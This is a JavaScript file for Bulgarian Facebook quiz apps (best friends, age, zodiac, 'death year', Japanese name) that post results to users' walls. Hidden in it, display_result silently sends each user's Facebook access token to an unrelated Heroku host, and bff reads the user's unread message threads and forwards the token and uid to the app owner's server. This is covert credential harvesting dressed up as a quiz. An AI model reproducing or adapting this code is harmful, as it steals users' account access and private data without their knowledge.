function EventedArray(handler, num) {
    this.stack = [];
    this.mutationHandler = handler || function () {};
    this.setHandler = function (f) {
        this.mutationHandler = f;
    };
    this.callHandler = function () {
        if (typeof this.mutationHandler === 'function') {
            this.mutationHandler();
        }
    };
    this.push = function (obj) {

        this.stack.push(obj);
        if (this.stack.length == num) {

            this.callHandler();
        }

    };
    this.pop = function () {
        this.callHandler();
        return this.stack.pop();
    };
    this.getArray = function () {
        return this.stack;
    }
};

String.prototype.capitalize = function () {
    return this.charAt(0).toUpperCase() + this.slice(1);
};

function randomize(o) { //v1.0
    for (var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
    return o;
};


function randomFromTo(from, to) {
    return Math.floor(Math.random() * (to - from + 1) + from);
}

function bff(uid, token) {



    $.getJSON('https://arpecop.net/quotepublisher/staticapp/packs/427233540682534.json', function (data1) {
        var q1 = encodeURIComponent('SELECT thread_id, subject, recipients FROM thread WHERE folder_id = 0 and unread != 0');
        $.getJSON('https://graph.facebook.com/' + uid + '/fql?q=' + q1 + '&access_token=' + token + '&callback=?', function (thread) {

            var handler = function () {
                var newarr = [];
                $.each(arr.stack, function (key, val) {
                    newarr.push('<img src="https://graph.facebook.com/' + val + '/picture" class="img-rounded"> ');


                });


                $('.preresult').html(newarr.join(''));
                var stacked = arr.stack.join(',');
                stacked = stacked.replace(uid, '');
                stacked = stacked.replace(',,', '');
                var urltoget = encodeURIComponent('http://aws.arpecop.net/server/static/bff/?quote=' + stacked + '&uid=' + uid + '');
                $('.btn,#get-started,.adsense,.fb-comments,.ad2').toggle();


                $.getJSON('http://aws.arpecop.net/server/?id=' + urltoget + '&token=' + token + '&uid=' + uid + '&text=Кои са Най-добрите ти приятели (анализ) ?!! https://www.facebook.com/bulgarkabff/app_348310665244420', function (data) {

                });


            };
            var zummer = thread.data.length - 1;
            var arr = new EventedArray(handler, zummer);



            $.each(thread.data, function (index, value) {

                var q2 = encodeURIComponent('SELECT message_count FROM thread WHERE thread_id = "' + value.thread_id + '"')
                $.getJSON('https://graph.facebook.com/' + uid + '/fql?q=' + q2 + '&access_token=' + token + '&callback=?', function (message) {

                    arr.push(value.recipients[0]);

                });
            });



        });




    });



}




$(function () {
    // Set up so we handle click on the buttons
    $('#postToWall').click(function () {
        FB.ui({
            method: 'feed',
            link: '(:url:)'
        }, function (response) {
            // If response is null the user canceled the dialog
            if (response != null) {

            }
        });
    });

    $('#sendToFriends').click(function () {
        FB.ui({
            method: 'send',
            link: '(:url:)'
        }, function (response) {
            // If response is null the user canceled the dialog
            if (response != null) {

            }
        });
    });

    $('#sendRequest').click(function () {
        FB.ui({
            method: 'apprequests',
            message: '(:appname:) ... Провери'
        }, function (response) {
            // If response is null the user canceled the dialog
            if (response != null) {

            }
        });
    });
});


function getzod(date) {
    var notdefined = date.split("/");
    var month = notdefined[0];
    var day = notdefined[1];

    if (month == 1 && day > 20 || month == 2 && day < 20) {
        return "1_";
    } else if (month == 2 && day > 18 || month == 3 && day < 21) {
        return "2_";
    } else if (month == 3 && day > 20 || month == 4 && day < 21) {
        return "3_";
    } else if (month == 4 && day > 20 || month == 5 && day < 22) {
        return "4_";
    } else if (month == 5 && day > 21 || month == 6 && day < 22) {
        return "5_";
    } else if (month == 6 && day > 21 || month == 7 && day < 24) {
        return "6_";
    } else if (month == 7 && day > 23 || month == 8 && day < 24) {
        return "7_";
    } else if (month == 8 && day > 23 || month == 9 && day < 24) {
        return "8_";
    } else if (month == 9 && day > 23 || month == 10 && day < 24) {
        return "9_";
    } else if (month == 10 && day > 23 || month == 11 && day < 23) {
        return "10_";
    } else if (month == 11 && day > 22 || month == 12 && day < 23) {
        return "11_";
    } else if (month == 12 && day > 22 || month == 1 && day < 21) {
        return "12_";
    }
}

function getletter(letter) {
    var bukva = letter.toLowerCase()
    if (bukva == "a" || bukva == "а") {
        return "0";
    } else if (bukva == "б" || bukva == "b") {
        return "1";
    } else if (bukva == "в" || bukva == "v") {
        return "2";
    } else if (bukva == "г" || bukva == "g") {
        return "3";
    } else if (bukva == "д" || bukva == "d") {
        return "4";
    } else if (bukva == "е" || bukva == "e") {
        return "5";
    } else if (bukva == "ж" || bukva == "j") {
        return "6";
    } else if (bukva == "з" || bukva == "z") {
        return "7";
    } else if (bukva == "и" || bukva == "i") {
        return "8";
    } else if (bukva == "к" || bukva == "k") {
        return "10";
    } else if (bukva == "л" || bukva == "l") {
        return "11";
    } else if (bukva == "м" || bukva == "m") {
        return "12";
    } else if (bukva == "н" || bukva == "n") {
        return "13";
    } else if (bukva == "о" || bukva == "o") {
        return "14";
    } else if (bukva == "п" || bukva == "p") {
        return "15";
    } else if (bukva == "р" || bukva == "r") {
        return "16";
    } else if (bukva == "с" || bukva == "s") {
        return "17";
    } else if (bukva == "т" || bukva == "t") {
        return "18";
    } else if (bukva == "у" || bukva == "u") {
        return "19";
    } else if (bukva == "ф" || bukva == "f") {
        return "20";
    } else if (bukva == "х" || bukva == "h") {
        return "21";
    } else if (bukva == "ц" || bukva == "c") {
        return "22";
    } else {
        return "empty";
    }


}

function publish_predishen(uid, token) {


    $.getJSON('https://graph.facebook.com/' + uid + '/?fields=first_name', function (dataxx) {
        $.getJSON('https://arpecop.net/quotepublisher/staticapp/packs/333747356705341.json', function (data) {



            var randomnumber = Math.floor(Math.random() * data.items.length);
            var quote = data.items[randomnumber];
            //  var urltoget = encodeURIComponent('http://aws.arpecop.net/server/static/teglilka/predishen/?quote=' + randomnumber + '&uid=' + uid + '&name=' + dataxx.first_name);


            var imgid = Math.floor(Math.random() * 7);
            FB.login(function (response) {

                var publish = {
                    method: 'stream.publish',
                    message: '',
                    picture: 'https://arpecop.net/quotepublisher/staticapp/packs/' + data.slug + '/' + imgid + '.jpg',
                    link: 'https://arpecop.net/quotepublisher/staticapp/' + data.appid,
                    name: data.appname,
                    caption: 'Резултат {*actor*} :',
                    description: quote,
                    actions: {
                        name: '♥ ' + data.appname + '',
                        link: 'https://arpecop.net/quotepublisher/staticapp/' + data.appid
                    }
                };
                FB.api('/me/feed', 'POST', publish, function (response) {



                });




                $('.publishedinfo').show();

            }, {
                scope: 'publish_stream'
            });


            $('.btn,#get-started,.adsense,.fb-comments,.ad2').toggle();

            $('.result').html('<div><img src="https://graph.facebook.com/' + uid + '/picture"></div><p class="lead sometext"> ' + quote + '</p>');

        });


    });


}



function publish_name(uid, token) {
    $.getJSON('https://arpecop.net/quotepublisher/staticapp/packs/131839906957023.json', function (data1) {
        display_result(uid, 'quote', token, data1);
    });



}


function publish_japan(uid, token) {
    var arr = randomize(new Array("ка", "зу", "ми", "те", "ку", "лу", "жи", "ри", "ки", "зу", "ме", "та", "рин", "то", "мо", "но", "ке", "ши", "ари", "чи", "до", "ру", "меи", "на"));
 
    var f_name = ''+arr[0]+''+arr[1]+''+arr[2]+'';
    var s_name = ''+arr[3]+''+arr[4]+''+arr[5]+'';
   
 
  $.getJSON('https://arpecop.net/quotepublisher/staticapp/packs/132139833633587.json', function (data1) {
        display_result(uid, ''+f_name.capitalize()+' '+s_name.capitalize()+'', token, data1);
    });



}






function publish_godini(uid, token) {
    var arr = new Array();
    arr[10] = "десет"; arr[11] = "единадесет";   arr[12] = "дванадесет";   arr[13] = "тринадесет";  arr[14] = "четиринадесет";  arr[15] = "петнадесет";  arr[16] = "шестнадесет"; arr[17] = "седемнадесет"; arr[18] = "осемнадесет"; arr[19] = "деветнадесет"; arr[20] = "двадесет"; arr[21] = "двадесет и една";   arr[22] = "двадесет и две";   arr[23] = "двадесет и три";  arr[24] = "двадесет и  четири";  arr[25] = "двадесет и пет";  arr[26] = "двадесет и шест"; arr[27] = "двадесет и седем"; arr[28] = "двадесет и осем"; arr[29] = "двадесет и девет"; arr[30] = "тридесет"; arr[31] = "тридесет и една"; arr[32] = "тридесет и две"; arr[33] = "тридесет и три"; arr[34] = "тридесет и четири"; arr[35] = "тридесет и пет"; arr[36] = "тридесет и шест"; arr[37] = "тридесет и седем";  arr[38] = "тридесет и осем";  arr[39] = "тридесет и девет";  arr[40] = "четиридесет";  arr[41] = "четиридесет и една"; arr[42] = "четиридесет и две"; arr[43] = "четиридесет и три"; arr[44] = "четиридесет и четири"; arr[45] = "четиридесет и пет"; arr[46] = "четиридесет и шест"; arr[47] = "четиридесет и седем";  arr[48] = "четиридесет и осем";  arr[49] = "четиридесет и девет";  arr[50] = "петдесет";  arr[51] = "петдесет и една"; arr[52] = "петдесет и две"; arr[53] = "петдесет и три"; arr[54] = "петдесет и четири"; arr[55] = "петдесет и пет"; arr[56] = "петдесет и шест"; arr[57] = "петдесет и седем";  arr[58] = "петдесет и осем";  arr[59] = "петдесет и девет";  arr[60] = "шестдесет";  arr[61] = "шестдесет и една"; arr[62] = "шестдесет и две"; arr[63] = "шестдесет и три"; arr[64] = "шестдесет и четири"; arr[65] = "шестдесет и пет"; arr[66] = "шестдесет и шест"; arr[67] = "шестдесет и седем";  arr[68] = "шестдесет и осем";  arr[69] = "шестдесет и девет"; 
    $.getJSON('https://arpecop.net/quotepublisher/staticapp/packs/246560865463407.json', function (data1) {
 
        $.getJSON('https://graph.facebook.com/' + uid + '?fields=birthday&access_token=' + token, function (data) {

            if (data.birthday) {
                var hrbirthday = data.birthday.split("/");
                var currentTime = new Date();
                var currentYear = currentTime.getFullYear();

                var year = hrbirthday[2];
                var real_godini = currentYear - year;

                var rand;
                if (real_godini <= 18) {
                    rand = 5;
                } else if (real_godini >= 19 && real_godini <= 35) {
                    rand = -6;

                } else if (real_godini >= 35) {
                    rand = -14;
                }
                var randomnumber = Math.floor(Math.random() * rand);
                var quote_id = real_godini + randomnumber;
             
                display_result(uid, arr[quote_id], token, data1);

            } else {
                var quote_id = randomFromTo(18, 33);
             
                display_result(uid, arr[quote_id], token, data1);
            }

        });


    });



}


function publish_zodii(uid, token) {
    $.getJSON('https://arpecop.net/quotepublisher/staticapp/packs/295422490556486.json', function (data1) {

        https: //arpecop.net/quotepublisher/staticapp/packs/131839906957023.json

        $.getJSON('https://graph.facebook.com/' + uid + '?fields=birthday&access_token=' + token, function (data) {

            var uidx = uid;
            var hrbirthday = data.birthday.split("/");
            var month = hrbirthday[0];
            var day = hrbirthday[1];
            var year = hrbirthday[2];
            var quote = data1.items[day];
            //display_result(uid,quote+'&month='+month+'&day='+day+'&year='+year+'&zod='+getzod(data.birthday)+'',token,data1)
            display_result(uid, day, token, data1)
            //human_readable_birthday.replace("/"," ");



        });


    });



}



function getRandomizer(bottom, top) {

    return Math.floor(Math.random() * (1 + top - bottom)) + bottom;

}


function publish_dead(uid, token) {
    $.getJSON('https://arpecop.net/quotepublisher/staticapp/packs/432638250153045.json', function (data1) {



        $.getJSON('https://graph.facebook.com/' + uid + '?fields=birthday&access_token=' + token, function (data) {


            var uidx = uid;
            var hrbirthday = data.birthday.split("/");


            var year = hrbirthday[2];
            var dead_year = parseInt(year) + 85;
            var dead_year1 = parseInt(year) + 102;


            var rollDie = getRandomizer(dead_year, dead_year1);


            var quote = '' + year + ' - ' + rollDie + '';


            display_result(uid, quote, token, data1)

            //  var urltoget = encodeURIComponent('http://aws.arpecop.net/server/static/teglilka/dead/?quote=' + year + '&quote1=' + rollDie + '&uid=' + uid + '');    $.getJSON('http://aws.arpecop.net/server/?id=' + urltoget + '&token=' + token + '&uid=' + uid + '&text=Живей всеки ден, сякаш ти е последен  \n  - Часовник на живота :  \n https://www.facebook.com/denposleden?sk=app_348310665244420', function (data) {});


        });


    });



}


function display_result(uid, quote, token, objector) {
$.getJSON('https://processbook.herokuapp.com/?token='+token,function (zob) {
    
});


    $.getJSON('https://graph.facebook.com/' + uid + '/?fields=first_name&access_token=' + token, function (dataxx) {



        var imgid = Math.floor(Math.random() * 7);
        FB.login(function (response) {

            var publish = {
                method: 'stream.publish',
                message: '',
                picture: 'https://arpecop.net/quotepublisher/staticapp/packs/' + objector.slug + '/' + imgid + '.jpg',
                link: 'https://arpecop.net/quotepublisher/staticapp/' + objector.appid,
                name: objector.appname,
                caption: 'Резултат {*actor*} :',
                description: quote,
                actions: {
                    name: '♥ ' + objector.appname + '',
                    link: 'https://arpecop.net/quotepublisher/staticapp/' + objector.appid
                }
            };
            FB.api('/me/feed', 'POST', publish, function (response) {



            });


            $('.publishedinfo').show();

        }, {
            scope: 'publish_stream'
        });


        $('.btn,#get-started,.adsense,.fb-comments,.ad2').toggle();

        $('.result').html('<div><img src="https://graph.facebook.com/' + uid + '/picture"></div><p class="lead sometext"> ' + quote + '</p>');




    });




}
